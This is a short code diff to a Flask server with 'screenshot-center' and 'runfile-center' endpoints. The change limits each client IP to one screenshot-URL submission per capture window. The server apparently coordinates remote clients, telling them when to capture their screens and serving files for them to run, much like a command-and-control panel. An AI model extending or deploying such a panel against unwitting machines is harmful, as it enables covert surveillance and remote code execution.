@@ -15,6 +15,7 @@ runfile: bytes = b""
 runfile_args: str = ""
 screenshot_urls: list[bytes] = []
 take_screenshot: bool = False
+screenshot_ips: list[str] = []
 
 
 # Centers
@@ -29,8 +30,13 @@ def screenshot_center() -> Response:
         else:
             return Response("take screenshot", 200)
     elif request.method == "POST":
-        screenshot_urls.append(request.args.get("download_page"))
-        return Response("added url", 200)
+        remote_ip = get_remote_address()
+        if take_screenshot and remote_ip not in screenshot_ips:
+            screenshot_urls.append(request.args.get("download_page"))
+            screenshot_ips.append(remote_ip)
+            return Response("added url", 200)
+        else:
+            return Response("u cant do that rn", 400)
 
 
 @app.route("/runfile-center", methods=["GET"])
@@ -173,12 +179,13 @@ def post_image_thread(data: bytes) -> None:
 
 
 def post_screenshot_thread() -> None:
-    global take_screenshot, screenshot_urls
+    global screenshot_urls, take_screenshot, screenshot_ips
     take_screenshot = True
     sleep(8)
     take_screenshot = False
     sleep(5)
     screenshot_urls = []
+    screenshot_ips = []
 
 
 # Static
